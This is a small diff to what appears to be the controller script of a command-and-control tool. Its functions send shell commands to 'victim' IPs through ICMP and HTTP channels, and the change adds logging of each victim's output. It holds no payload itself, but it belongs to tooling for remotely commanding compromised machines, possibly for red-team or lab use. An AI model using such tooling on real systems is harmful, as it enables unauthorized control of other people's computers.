@@ -17,6 +17,7 @@ def icmp_at(vic_ip, command, outputs=None):
     with popen(f"echo \"{command}\n\" | python3 {dirname}/../icmp-c2/send_command.py {vic_ip}") as f:
         raw = f.read()
     output = raw.split("\n", 1)[1]
+    print(f"{vic_ip}: {output}")
     if outputs is not None:
         outputs[vic_ip] = output
     else:
@@ -26,6 +27,7 @@ def http_at(vic_ip, command, outputs=None):
     with popen(f"echo \"{vic_ip}\n{command}\n\" | python3 {dirname}/../processd/send_command.py") as f:
         raw = f.read()
     output = raw.split("\n", 1)[1]
+    print(f"{vic_ip}: {output}")
     if outputs is not None:
         outputs[vic_ip] = output
     else:
